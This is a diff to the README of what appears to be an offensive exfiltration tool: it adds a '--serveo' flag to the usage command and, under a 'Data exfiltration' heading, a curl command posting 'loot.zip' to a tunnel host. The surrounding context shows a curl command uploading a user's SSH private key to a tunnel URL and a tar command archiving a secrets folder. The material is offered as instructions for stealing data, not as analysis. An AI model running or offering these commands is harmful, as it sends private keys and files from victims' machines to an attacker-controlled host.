@@ -100,7 +100,7 @@ sudo apt update && sudo apt install cloudflared -y
 ```
 ## 📡 Usage
 ```bash
-sudo python3 webhook.py -p 8080 -d /var/www/html
+sudo python3 webhook.py -p 8080 --serveo -d /var/www/html
 ```
 ![usage](assets/usage.png)
 ![output](assets/output.png)
@@ -110,6 +110,8 @@ sudo python3 webhook.py -p 8080 -d /var/www/html
 
 ## 🔁 Data exfiltration
 ```bash
+curl -X POST http://abc123.cloudflaretunnel.com/upload --data-binary "@loot.zip"
+
 curl -F "file=@/home/user/.ssh/id_rsa" https://abc123.cloudflareTunnel.com/upload
 
 tar czf secrets.tar.gz ~/Documents/secrets
